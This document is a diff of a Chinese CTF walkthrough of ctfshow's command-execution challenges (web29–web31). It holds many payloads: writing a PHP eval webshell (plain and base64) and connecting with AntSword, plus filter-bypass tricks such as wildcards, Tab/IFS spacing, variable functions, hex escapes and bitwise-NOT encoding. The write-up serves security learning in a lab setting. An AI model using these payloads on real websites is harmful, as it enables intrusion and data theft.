@@ -1,8 +1,9 @@
 ---
-title: "ctfshow-WEB入门命令执行"
-description: "ctfshow-WEB入门命令执行"
+title: "ctfshow-WEB入门（命令执行）"
+description: "ctfshow-WEB入门（命令执行）"
 image: "/assets/西施2.jpg"
 date: 2026-11-05
+updated: 2026-11-05
 categories:
   - 学习
 tags:
@@ -13,12 +14,12 @@ tags:
 type: tech
 ---
 
-## ctfshow-WEB入门命令执行
+## ctfshow-WEB入门（命令执行）
 
 ::link-banner
 ---
-banner: /assets/莫弈，鸟，美人.jpg
-title: WEB入门题（命令执行）
+banner: /assets/西施，冰雪.jpg
+title: ctfshow-WEB入门（命令执行）
 description: 题目来源:ctfshow的WEB入门题
 link: "https://ctf.show/challenges"
 ---
@@ -384,15 +385,7 @@ c 的值是 `eval($_GET[1]);`——里面没有 flag；命令藏在**第二个�
 
 #### 法7：写一句话木马 + 蚁剑
 
-```
-?c=file_put_contents('shell.php','<?php eval($_POST[1]);?>');
-```
-
-![image-20261105124807362](/assets/ctfshow-web-command-exec/image-20261105124807362.png)
-
-
-
-往服务器写一个新文件 shell.php（内容是个一句话木马），然后用**中国蚁剑**（`cd /d C:\HelloCTF\Toolkit\Web\AntSword-Loader-v4.0.3-win32-x64
+打开**中国蚁剑**（`cd /d C:\HelloCTF\Toolkit\Web\AntSword-Loader-v4.0.3-win32-x64
 AntSword.exe`）
 
 ![image-20261105125226271](/assets/ctfshow-web-command-exec/image-20261105125226271.png)
@@ -405,7 +398,15 @@ AntSword.exe`）
 <URL>?c=file_put_contents('shell.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=='));
 ```
 
-> 解释：`PD9waHAg...` 解码就是 `<?php @eval($_POST[1]);?>`，也就是一句话木马。`@` 用来压制报错。页面**没反应/空白是正常的**（`error_reporting(0)` 关掉了回显）。
+![image-20261105185540035](/assets/ctfshow-web-command-exec/image-20261105185540035.png)
+
+base64前原来的木马
+
+```
+?c=file_put_contents('shell.php','<?php eval($_POST[1]);?>');
+```
+
+> `PD9waHAg...` 解码就是 `<?php @eval($_POST[1]);?>`，也就是一句话木马。`@` 用来压制报错。页面**没反应/空白是正常的**（`error_reporting(0)` 关掉了回显）。
 
 **验证是否写成功**：再访问
 
@@ -413,33 +414,50 @@ AntSword.exe`）
 https://....challenge.ctf.show/shell.php
 ```
 
-- 页面空白（不报 404）→ 木马已写入 ✅
+![image-20261105185604958](/assets/ctfshow-web-command-exec/image-20261105185604958.png)
+
+- 页面空白（不报 404）→ 木马已写入
 - 显示 404 → 没写成功，回去检查 payload 有没有粘全
 
 ##### 在蚁剑里添加 shell
 
-1. 右侧「分类目录」里**右键「默认分类」→ 添加**（或点上面的「添加」按钮）
-2. 弹窗里填：
+左侧空白界面里右键，点击`添加数据`
 
-| 选项              | 填什么                                             |
-| :---------------- | :------------------------------------------------- |
-| **URL 地址**      | `https://70a5c459-...challenge.ctf.show/shell.php` |
-| **连接密码**      | `1`                                                |
-| 编码器 / 编码设置 | 默认（default）                                    |
-| 类型              | PHP（一般会自动识别）                              |
+![image-20261105172154200](/assets/ctfshow-web-command-exec/image-20261105172154200.png)
 
-1. 点「测试连接」：
-	- 显示类似「成功 / 返回数据正常」→ 点「添加」保存
-	- 显示失败 → 看下面「连不上怎么办」
-2. 回到主界面，**双击**刚添加的那条记录，就进入文件管理了。
+
+
+![image-20261105172214651](/assets/ctfshow-web-command-exec/image-20261105172214651.png)
+
+弹窗里填：
+
+| 选项              | 填什么                                                       |
+| :---------------- | :----------------------------------------------------------- |
+| **URL 地址**      | `http://70a5c459-...challenge.ctf.show/shell.php`（==去掉https的s==） |
+| **连接密码**      | `1`                                                          |
+| 编码器 / 编码设置 | 默认（default）                                              |
+| 类型              | PHP（一般会自动识别）                                        |
+
+1.点「测试连接」：
+
+- 显示类似「成功 / 返回数据正常」→ 点「添加」保存
+- 显示失败 → 看下面「连不上怎么办」
+
+2.回到主界面，**双击**刚添加的那条记录，就进入文件管理了。
+
+![image-20261105190757398](/assets/ctfshow-web-command-exec/image-20261105190757398.png)
 
 ##### 找 flag
 
 进去后默认打开**文件管理**，左边是目录树：
 
-1. 定位到网站根目录（就是你 shell.php 所在目录）
-2. 找到 `flag.php` → 右键「打开」/「编辑」直接看内容
-3. 里面就是 `ctfshow{...}`
+1.定位到网站根目录（就是你 shell.php 所在目录）
+
+2.找到 `flag.php` → 右键「打开」/「编辑」直接看内容
+
+3.里面就是 `ctfshow{...}`
+
+![image-20261105190829059](/assets/ctfshow-web-command-exec/image-20261105190829059.png)
 
 另外也可以用上方的 **「虚拟终端」**（有的版本叫「终端」），直接敲：
 
@@ -448,9 +466,13 @@ ls
 cat flag.php
 ```
 
+![image-20261105191209968](/assets/ctfshow-web-command-exec/image-20261105191209968.png)
+
+![image-20261105191316303](/assets/ctfshow-web-command-exec/image-20261105191316303.png)
+
 效果和你在网页里 `?c=system("cat fla*");` 一样，但能交互式执行任意命令。
 
-连接 `https://靶机/shell.php`，密码 `1`，图形化界面里翻文件就像操作自己的电脑。也有人不写内容直接 `eval($_POST[1])` 连当前页。
+连接 `https://靶机/shell.php`，密码 `1`，图形化界面里翻文件就像操作自己的电脑。也可以不写内容直接 `eval($_POST[1])` 连当前页。
 
 #### 法8：反引号内联执行
 
@@ -461,3 +483,331 @@ cat flag.php
 反引号（键盘左上角、和 `~` 同一个键）在 PHP 里等价于 `shell_exec()`，执行命令并返回结果。
 
 ![image-20261105122908755](/assets/ctfshow-web-command-exec/image-20261105122908755.png)
+
+##### Q1：
+
+```
+?c=echo `tac fla*`;
+```
+
+里``是什么意思，有什么用？
+
+> 这两个符号叫**反引号**，在 shell 里它表示命令替换。这是 **Linux shell** 的语法，运行在远程靶机上。
+>
+> 它的作用：先执行里面的命令，再把结果替换出来
+>
+> **shell 看到反引号后，会做两件事：**
+>
+> 1.先把反引号**里面的命令执行一遍**
+>
+> 2.再把整段反引号（包括两个 ` 符号）替换成那条命令的**输出结果**，然后才执行外面的命令
+>
+> 所以这条命令：
+>
+> ```
+> echo `tac fla*`
+> ```
+>
+> 执行过程是：
+>
+> 1.shell 先跑 `tac fla*`，得到 flag 文件的内容（比如 `flag{xxxx}`）
+>
+> 2.命令就变成了 `echo flag{xxxx}`
+>
+> 3.echo 再把这段内容打印出来，你就看到了 flag
+
+##### Q2：?c=echo `tac fla*`;里加不加``有什么区别？
+
+> - `echo tac fla*`（没有反引号）：echo 只会把 `tac` 和文件名当**普通文字**打印出来，tac 根本不执行
+>
+> - ```
+> 	echo `tac fla*`;
+> 	```
+>
+> 	（有反引号）：tac 会被**执行**，echo 打印的是 tac 读出来的内容
+>
+> 反引号是老式语法，现在 shell 更推荐用 **`$( )`**，效果是一样的：
+>
+> ```
+> echo $(tac fla*)
+> ```
+>
+> `$( )` 的好处是可以层层嵌套（命令里再套命令），如果使用反引号，嵌套时要写一堆转义符，会比较麻烦。
+
+##### 区分这三种引号：
+
+> - 反引号 `：执行里面的命令并替换成输出
+> - 单引号 '：里面的内容原样保留，不做任何执行和替换
+> - 双引号 "：里面允许变量和命令替换生效
+
+### web30
+
+![image-20261105194121470](/assets/ctfshow-web-command-exec/image-20261105194121470.png)
+
+php代码的意思是传参c里不能出现flag，system，php。无论大小写。
+
+#### web29在这里复用的方法
+
+| 方法           | payload                                                      | 说明                                   |
+| :------------- | :----------------------------------------------------------- | :------------------------------------- |
+| 通配符         | `?c=passthru("tac fla*");`                                   | `*` 匹配任意长度                       |
+| 单字符通配     | `?c=passthru("tac fla?????");`                               | `?` 匹配单个字符(fla+5个=8位=flag.php) |
+| **一石二鸟了** | `?c=passthru("tac f*");`                                     | `f*` 同时避开 flag 和 php 两个词       |
+| 参数转移       | `?c=eval($_GET[1]);&1=system("tac flag.php");`               | c 里干净，命令执行放参数 1             |
+| 伪协议         | `?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php` | 输出 base64 再解码                     |
+| 拷走           | `?c=passthru("cp fla*.ph* 2.txt");` 再访问 `/2.txt`          | 用通配符绕 php                         |
+| 蚁剑           | 写木马后连                                                   | 需要容器活着                           |
+
+#### 下面是一些其他新增的解法：
+
+##### 1.换命令执行函数(替代 system)
+
+PHP 里能执行系统命令的函数有一大把，system 只是最常用的那个：
+
+| 函数           | 写法                              | 回显特点                               |
+| :------------- | :-------------------------------- | :------------------------------------- |
+| `system()`     | 被挡                              | 直接输出全部结果                       |
+| `passthru()`   | `?c=passthru("tac fla*");`        | 直接输出(二进制也安全)                 |
+| `shell_exec()` | `?c=echo shell_exec("tac fla*");` | **返回**字符串，**必须 echo 才看得到** |
+| `exec()`       | `?c=echo exec("tac fla*");`       | 只返回**最后一行**，必须 echo          |
+| 反引号         | `?c=echo `tac fla*`;`             | 等价 `shell_exec`，最省事              |
+
+##### 2.动态函数调用(可变函数)
+
+PHP 有个特性：**变量后面加括号，如果变量的值是函数名字符串，就调用那个函数**。这叫「可变函数(variable function)」。
+
+```
+?c=$a='sys';$b='tem';$d=$a.$b;$d('tac fl*');
+```
+
+逐步看：
+
+- `$a='sys';` → 变量 a 存了 `sys`
+- `$b='tem';` → 变量 b 存了 `tem`
+- `$d=$a.$b;` → 拼接成 `system`（`.` 在 PHP 里是字符串连接符）
+- `$d('tac fl*');` → 变量 d 的值是 "system"，于是**调用 system** 执行命令
+
+**为什么能过正则？** 因为我们提交的字符串里，`sys` 和 `tem` 是两个分开的字符串，从头到尾没有出现过连续的 `system` 七个字母。正则检查的是"字面文本"，而函数名是**运行时才拼出来**的，这是「检查时刻 vs 使用时刻」的时间差。
+
+> 同类变体：`call_user_func('passthru','ls')`、用 `chr()` 拼函数名、`strrev('metsys')`（倒序）。
+
+##### 3.shell 层拼文件名(反斜杠 / 引号)
+
+这两个技巧**必须在命令执行函数里用**（因为要靠 Linux shell 解析）：
+
+**反斜杠转义**：
+
+```
+?c=passthru("cat f\lag.p\hp");
+```
+
+- PHP 收到的字符串是 `cat f\lag.p\hp`——正则找 `flag` 找不到（中间隔着 `\`），找 `php` 也找不到
+- 命令交给 Linux shell 后，shell 把 `\l` 解释为"转义 l"，去掉反斜杠 → 实际执行 `cat flag.php`
+
+**引号拼接**：
+
+```
+?c=passthru("cat fl''ag.p''hp");
+```
+
+- 提交的字符串是 `fl''ag.p''hp`，同样没有连写的 flag/php
+- shell 里**相邻的字符串会自动拼接**：`fl` + `ag` = `flag`，`p` + `hp` = `php`
+
+> 这就是常说的「**双层解析**」：PHP 层先过正则，shell 层再做真正的解析。你写的东西在两层里"看起来不一样"，绕过就发生了。
+
+##### 4.PHP 层拼字符串(chr / base64 / 连接符)
+
+不靠 shell，直接在 PHP 里把文件名拼出来：
+
+```
+?c=readfile('fl'.'ag'.chr(46).chr(112).chr(104).chr(112));
+```
+
+- PHP 的 `.` 连接字符串：`'fl'.'ag'` = `flag`
+- `chr(46)` = `.`，`chr(112)` = `p`，`chr(104)` = `h`，`chr(112)` = `p` → 拼出 `.php`
+- `readfile()` 直接把文件内容输出到页面
+
+base64 版（web29 也用过）：
+
+```
+?c=passthru(base64_decode('Y2F0IGZsYWcucGhw'));
+```
+
+（`Y2F0IGZsYWcucGhw` 解码 = `cat flag.php`）
+
+##### 5.纯 PHP 读文件(用不到系统命令)
+
+```
+?c=show_source(scandir('.')[2]);
+```
+
+拆开看：
+
+- `scandir('.')` → 列出当前目录，返回数组 `['.', '..', 'flag.php', 'index.php']`（按字母序）
+- `[2]` → 取**下标 2** 的元素，正好是 `flag.php`
+- `show_source()` → 高亮显示该文件源码（PHP 函数，不是 shell 命令）
+
+整个 payload 里没有 flag、没有 system、没有 php 三个词。类似的还有：
+
+| 函数                  | 作用                             |
+| :-------------------- | :------------------------------- |
+| `highlight_file()`    | 高亮输出文件源码（复用自 web29） |
+| `show_source()`       | 同上，是别名                     |
+| `readfile()`          | 直接输出文件内容                 |
+| `file_get_contents()` | 读成字符串，需要 echo            |
+
+### web31
+
+![image-20261105210331377](/assets/ctfshow-web-command-exec/image-20261105210331377.png)
+
+```
+"/flag|system|php|cat|sort|shell|\.| |\'/i"
+```
+
+- 两个 `/` 是正则的边界符
+- `|` 表示 “或者”，所以每一段都是一个独立的禁词
+- `\.` 里的反斜杠是转义，意思是 “**字面意义的点**”（不转义的点在正则里是任意字符）
+- ` ` 单独一个空格，就是禁止空格
+- `\'` 表示**单引号**
+- 结尾的 `/i` 是大小写不敏感，所以 `FLAG`、`Php`、`Cat` 这种大写也一样拦
+
+**提交的 c 参数里，不能出现下面的任何一个：**
+
+flag，system，php，cat，sort，shell，.（点），空格，单引号 `'`
+
+#### 之前题目复用的方法
+
+| 方法                                     | 在 web31 的写法                                | 备注                                 |
+| :--------------------------------------- | :--------------------------------------------- | :----------------------------------- |
+| **通配符**                               | `fla*`、`f*`、`fla?????`                       | `f*` 同时绕 flag 和 php              |
+| **参数转移 / eval 嵌套**                 | `?c=eval($_GET[1]);&1=system("tac flag.php");` | **万能钥匙**，因为 preg_match 只查 c |
+| **passthru 换 system**                   | `?c=passthru("ls");`                           | web30说过了，继续用                  |
+| **反引号执行**                           | ?c=echo`tac%09fla*`;                           | shell 二字被挡但反引号本身没被挡     |
+| **show_source/highlight_file + scandir** | `show_source(scandir(getcwd())[2])`            | 思路一样，但 `.` 要换写法(见下)      |
+| **base64_decode**                        | `?c=passthru(base64_decode("..."));`           | base64 串本身安全，但包裹要用双引号  |
+
+**在 web31 失效了（web30 能用，这里不能）**
+
+| 方法                                          | 为什么失效          | 替代                                      |
+| :-------------------------------------------- | :------------------ | :---------------------------------------- |
+| PHP 点号拼接 `'fl'.'ag'`、`$a.$b` 拼 `system` | **`.` 被挡**        | 用 `chr()` 拼、`"\xHH"`、参数转移         |
+| 单引号字符串 `'ls'`                           | **`'` 被挡**        | 改用双引号 `"ls"`                         |
+| `php://filter` 伪协议                         | 含 **php** 三个字母 | 用 getcwd/glob 读文件                     |
+| `cp flag.php a.txt` 落地                      | 文件名有**点**      | `cp fla* 1`（无扩展名），或 `cp fla*%09a` |
+| `shell_exec()`                                | 含 **shell**        | 反引号 / passthru                         |
+| `system()`                                    | 含 **system**       | passthru / exec / 反引号                  |
+
+**本次新学的（一共 5 组）内容是：**
+
+1. 空格替代：`%09`(Tab)、`${IFS}`
+2. 读文件命令替代：`tac`、`nl`、`tail`、`head`
+3. 点号替代：`getcwd()`、`pos(localeconv())`、`chr(46)`
+4. 字符串构造升级：十六进制转义 `"\x66\x6c..."`、`glob()`
+5. 进阶：取反 `~` 绕过
+
+#### 这三条比较常用，记这三条：
+
+`passthru("tac%09fla*")`、`eval($_GET[1])` 嵌套、`show_source(scandir(getcwd())[2])`。
+
+#### 一些新的方法：
+
+##### 1.空格被挡可以使用`%09` 或 `${IFS}`
+
+`%09` 是 **Tab（制表符）** 的 URL 编码。Linux shell 把 Tab 和空格一样当"分隔符"，而正则匹配的是字面空格字符，Tab 不是空格，所以能够绕过。
+
+```
+?c=passthru("tac%09fla*");
+```
+
+其他等价写法：
+
+| 写法                         | 原理                                                |
+| :--------------------------- | :-------------------------------------------------- |
+| `%09`                        | Tab，最常用                                         |
+| `$IFS` / `${IFS}` / `$IFS$9` | IFS 是 shell 的内置变量，值默认是「空格+Tab+换行」  |
+| `%20`                        | URL编码，这个**不行**，它解码出来就是空格，正好被挡 |
+
+**容易踩坑的地方**：双引号字符串里 `$` 会被 PHP 当成变量插值。写 `"tac${IFS}fla*"` 时 PHP 会把 `${IFS}` 替换成空值，命令变成 `tacfla*` 就错了。所以要**反斜杠转义**：
+
+```
+?c=passthru("tac\${IFS}fla*");
+```
+
+##### 2.cat/sort 被挡，那么换成-读文件命令
+
+| 原命令 | 替代                                                      |
+| :----- | :-------------------------------------------------------- |
+| `cat`  | `tac`(倒序)、`nl`(带行号)、`tail`、`head`、`more`、`less` |
+
+任何一条都行，`tac`（web29已经说过了）。
+
+##### 3.shell 被挡，shell_exec 不可以，反引号可以
+
+`shell_exec("cmd")` 含 `shell`，直接被挡。但反引号 ``cmd`` 是它语法层面的等价物，没有任何被挡的字面：
+
+```
+?c=echo`tac%09fla*`;
+```
+
+##### 4.点号被挡，有三种拿"当前目录"的办法
+
+原来大家爱写 `scandir(".")`，现在 `.` 不能出现。三个替代：
+
+**(1) `getcwd()`**
+
+```
+?c=show_source(scandir(getcwd())[2]);
+```
+
+`getcwd()` 返回当前工作目录路径（字符串），不需要点号。
+
+**(2)`pos(localeconv())`**
+
+```
+?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
+```
+
+- `localeconv()` 返回本地化信息数组，**第一个元素就是小数点 `"."`**
+- `pos()` = `current()`，取数组当前第一个元素 → 得到 `"."`
+
+**(3)`chr(46)` / `"\x2e"`**
+
+```
+?c=show_source(scandir(chr(46))[2]);
+```
+
+`chr(46)` 就是 `.` 的 ASCII 码，字面上不含点。
+
+##### 5.十六进制转义（构造文件名）
+
+PHP 双引号字符串支持 `\xHH` 转义：
+
+```
+?c=readfile("\x66\x6c\x61\x67\x2e\x70\x68\x70");
+```
+
+`\x66\x6c\x61\x67` = `flag`，`\x2e` = `.`，`\x70\x68\x70` = `php` → 拼成 `flag.php`。payload 里没有 flag/php/点的字面。
+
+##### 6.`glob()` 直接找文件
+
+```
+?c=$f=glob("f*");show_source($f[0]);
+```
+
+`glob("f*")` 返回匹配的文件路径数组 `['flag.php']`，`$f[0]` 取第一个，`show_source` 读它。不用写flag、不写 php、不写点。
+
+##### 7.取反 `~` 绕过（了解即可）
+
+```
+?c=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F);
+```
+
+原理：把 `system` 和 `cat flag.php` 每个字符取按位取反(`~`)，得到一堆高位字节，URL 编码后提交。正则里当然没有这些乱码，运行时 PHP 再 `~` 一次还原成明文。
+
+##### 8.命令替换 `$(...)`（不写文件名的思路）
+
+```
+?c=echo`tac $(ls -1 | head -n 1)`;
+```
+
+`ls -1 | head -n 1` 动态拿到第一个文件名，再交给 tac。好处是**完全不用写文件名**。但注意：必须有反引号（让整串作为命令执行）。
